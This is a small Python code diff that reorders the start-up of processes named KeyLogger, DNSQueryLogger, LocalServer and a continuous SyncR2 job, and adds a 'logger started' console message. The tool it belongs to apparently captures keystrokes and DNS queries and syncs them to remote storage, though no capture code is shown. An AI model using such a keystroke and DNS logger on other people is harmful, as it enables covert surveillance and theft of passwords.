@@ -10,38 +10,41 @@ def create_processes(choice):
     proc = []
     if choice == 1:
         proc = [
-            multiprocessing.Process(target=server, name="LocalServer"),
-            multiprocessing.Process(target=sync, kwargs={"continuous": True}, name="SyncR2"),
             multiprocessing.Process(target=key_logger, name="KeyLogger"),
             multiprocessing.Process(target=dns_logger, name="DNSQueryLogger"),
+            multiprocessing.Process(target=server, name="LocalServer"),
+            multiprocessing.Process(target=sync, kwargs={"continuous": True}, name="SyncR2"),
+            
         ]
     elif choice == 2:
         proc = [
-            multiprocessing.Process(target=server, name="LocalServer"),
             multiprocessing.Process(target=key_logger, name="KeyLogger"),
             multiprocessing.Process(target=dns_logger, name="DNSQueryLogger"),
+            multiprocessing.Process(target=server, name="LocalServer"),
         ]
     elif choice == 3:
         proc = [
+            multiprocessing.Process(target=key_logger, name="KeyLogger"),
             multiprocessing.Process(target=server, name="LocalServer"),
             multiprocessing.Process(target=sync, kwargs={"continuous": True}, name="SyncR2"),
-            multiprocessing.Process(target=key_logger, name="KeyLogger"),
+            
         ]
     elif choice == 4:
         proc = [
-            multiprocessing.Process(target=server, name="LocalServer"),
             multiprocessing.Process(target=key_logger, name="KeyLogger"),
+            multiprocessing.Process(target=server, name="LocalServer"),
+            
         ]
     elif choice == 5:
         proc = [
-            multiprocessing.Process(target=server, name="LocalServer"),
-            multiprocessing.Process(target=sync, kwargs={"continuous": True}, name="SyncR2"),
             multiprocessing.Process(target=dns_logger, name="DNSQueryLogger"),
+            multiprocessing.Process(target=server, name="LocalServer"),
+            multiprocessing.Process(target=sync, kwargs={"continuous": True}, name="SyncR2"), 
         ]
     elif choice == 6:
         proc = [
-            multiprocessing.Process(target=server, name="LocalServer"),
             multiprocessing.Process(target=dns_logger, name="DNSQueryLogger"),
+            multiprocessing.Process(target=server, name="LocalServer"),
         ]
     return proc
 
@@ -84,6 +87,9 @@ def main():
             else:
                 log_console("Wrong Input! Try again.", "WARNING")
                 continue
+
+            # Show logger start message before starting processes
+            log_console("Key/DNS Logger started.", "SUCCESS")
 
             # Start and join all selected processes with error handling
             try:
